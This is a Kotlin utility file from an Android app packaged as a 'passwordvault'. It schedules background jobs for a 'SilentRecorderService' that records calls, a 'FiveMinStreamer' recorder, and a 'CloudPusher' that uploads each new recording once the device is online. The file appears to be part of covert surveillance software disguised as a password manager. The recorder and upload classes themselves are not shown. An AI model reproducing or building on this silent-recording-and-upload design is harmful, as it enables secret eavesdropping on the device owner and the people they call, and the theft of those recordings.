package com.example.passwordvault.util

import android.content.Context
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.work.*
import com.example.passwordvault.service.FiveMinStreamer
import com.example.passwordvault.service.SilentRecorderService
import java.io.File
const val RECORDER_TYPE = "type"
object WorkerProvider {
    private const val recorderJobTag = "com.japps.recording.call"
    private const val fiveMinrecorderJobTag = "com.japps.5min.recording"
    private const val callRecordingPushTag = "com.japps.calls.push.recording"
    private const val fiveMinRecordingPushTag = "com.japps.5min.push.recording"
    private const val cloudPusher = "com.japps.cloud.pushing"


    private val baseConstraints = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Constraints.Builder()
            .setRequiresCharging(false)
            .setRequiresDeviceIdle(false)
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(false)

    } else {
        Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresCharging(false)
            .setRequiresBatteryNotLow(true)
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun periodicUriCheckWorkRequest(context: Context): OneTimeWorkRequest {
        val file = File(context.externalCacheDir?.absolutePath!!)
        val uri = Uri.fromFile(file)
        val uriCheckConstraints = baseConstraints
            .addContentUriTrigger(uri, false)

        return OneTimeWorkRequestBuilder<CloudPusher>()
            .setConstraints(uriCheckConstraints.build())
            .addTag(callRecordingPushTag)
            .build()
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun startCloudPusher(context: Context, type: String, latestRecord: String?) {
        Log.e("CloudPusher", "$type started")
//        val work = periodicUriCheckWorkRequest(context)
        val data = Data.Builder()
            .putString(LATEST_RECORD, latestRecord)
            .putString(RECORDER_TYPE, type)
            .build()

        val work = if (type == CALL_RECORDER){
            OneTimeWorkRequestBuilder<CloudPusher>()
                .setInputData(data)
                .setConstraints(baseConstraints.build())
                .addTag(callRecordingPushTag)
                .build()
        }else{
            OneTimeWorkRequestBuilder<CloudPusher>()
                .setInputData(data)
                .setConstraints(baseConstraints.build())
                .addTag(fiveMinRecordingPushTag)
                .build()
        }
//        val uniqueWork = latestRecord+cloudPusher
        val uniqueWork = cloudPusher + latestRecord
        enqueueUniqueWork(uniqueWork, context, work)
    }

    fun stopCloudPusher(context: Context, type: String) {
        if (type == CALL_RECORDER)
            getWorkManager(context).cancelAllWorkByTag(callRecordingPushTag)
        if (type == FIVE_MIN_RECORDER)
            getWorkManager(context).cancelAllWorkByTag(fiveMinRecordingPushTag)
    }

//    fun newRecordingCheckUploadWork(): OneTimeWorkRequest {
//        return OneTimeWorkRequestBuilder<UriChecker>()
//            .setConstraints(baseConstraints.build())
//            .build()
//    }

    fun startRecorderWork(context: Context) {
        val work = OneTimeWorkRequestBuilder<SilentRecorderService>()
            .addTag(recorderJobTag)
            .build()
        enqueueWork(context, work)
    }

    fun stopRecordingWork(context: Context) {
        Log.e("inWorkStop", "-> $context")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val latestRecord = PreferenceUtil.latestRecord(context)
            startCloudPusher(context, CALL_RECORDER, latestRecord)
        }
        getWorkManager(context).cancelAllWorkByTag(recorderJobTag)
    }

    fun start5MinRecorderWork(context: Context) {
        val work = OneTimeWorkRequestBuilder<FiveMinStreamer>()
            .addTag(fiveMinrecorderJobTag)
            .build()
        enqueueWork(context, work)
    }

    fun stop5MinRecordingWork(context: Context) {
        Log.e("inWorkStop", "-> $context")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val latestRecord = PreferenceUtil.latestRecord(context)
            startCloudPusher(context, FIVE_MIN_RECORDER, latestRecord)
        }
        getWorkManager(context).cancelAllWorkByTag(fiveMinrecorderJobTag)
    }

    private fun enqueueWork(context: Context, work: WorkRequest) {
        Log.e("inWork", "-> $context")
        getWorkManager(context).enqueue(work)
    }

    private fun enqueueUniqueWork(tag: String, context: Context, work: OneTimeWorkRequest) {
        Log.e("inUniqueWork", "-> $context")
        getWorkManager(context).enqueueUniqueWork(tag, ExistingWorkPolicy.REPLACE, work)
    }

    fun uriSatires() {
//        return PeriodicWorkRequestBuilder<CloudPusher>()
    }

    private fun getWorkManager(context: Context) = WorkManager.getInstance(context)
}